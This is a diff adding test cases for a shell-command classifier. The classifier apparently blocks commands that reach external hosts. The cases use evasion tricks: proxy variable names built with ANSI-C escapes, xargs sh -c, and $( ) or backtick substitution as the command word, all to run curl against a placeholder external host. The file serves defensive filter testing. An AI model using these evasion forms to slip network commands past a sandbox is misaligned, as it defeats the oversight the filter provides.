@@ -275,3 +275,35 @@ describe('card d6b95892 round 6', () => {
     expect(classify(cmd), cmd).toMatchObject({ deny: true, hosts: ['<computed variable name>'] })
   })
 })
+
+describe('card d6b95892 round 7', () => {
+  it.each([
+    ['export of an ANSI-C built proxy name', `export http$'\\x5f'proxy=http://${EV}:1; curl -s http://localhost:3420/`],
+    ['declare -x of an ANSI-C built proxy name', `declare -x http$'\\x5f'proxy=http://${EV}:1; curl -s http://localhost:3420/`],
+    ['env of an ANSI-C built proxy name', `env http$'\\x5f'proxy=http://${EV}:1 curl -s http://localhost:3420/`],
+  ])('denies %s (a regression of round 6)', (_name, cmd) => {
+    expect(classify(cmd), cmd).toMatchObject({ deny: true, hosts: ['<proxy variable>'] })
+  })
+  it('denies T4 xargs sh -c running $0 as the command', () => {
+    const cmd = `echo "curl -s https://${EV}/x" | xargs sh -c '$0 "$@"'`
+    expect(classify(cmd), cmd).toMatchObject({ deny: true, reason: 'xargs-stdin-command' })
+  })
+  it.each([
+    ['T17 a $( ) substitution', `$(echo curl) -s https://${EV}/x`],
+    ['T18 a backtick substitution', '`echo curl` -s https://' + EV + '/x'],
+    ['a quoted substitution after another command', `cd /tmp; "$(echo curl)" -s https://${EV}/x`],
+  ])('denies %s as the command word', (_name, cmd) => {
+    expect(classify(cmd), cmd).toMatchObject({ deny: true, reason: 'unread-command-word', hosts: [EV] })
+  })
+  it('denies T21 a substitution as the command word of a sh -c body', () => {
+    const cmd = `sh -c "$(echo curl) -s https://${EV}/x"`
+    expect(classify(cmd), cmd).toMatchObject({ deny: true, reason: 'shell-c-unread-command-word', hosts: [EV] })
+  })
+  it.each([
+    ['a substitution command word to a local host', '$(echo curl) -s http://localhost:3420/'],
+    ['a substitution path prefix with no network tool', '$(git rev-parse --show-toplevel)/scripts/x.sh a b'],
+    ['a sh -c body with a substitution argument', `sh -c "echo $(date); curl -s http://localhost:3420/"`],
+  ])('passes %s', (_name, cmd) => {
+    expect(classify(cmd), cmd).toMatchObject({ deny: false })
+  })
+})
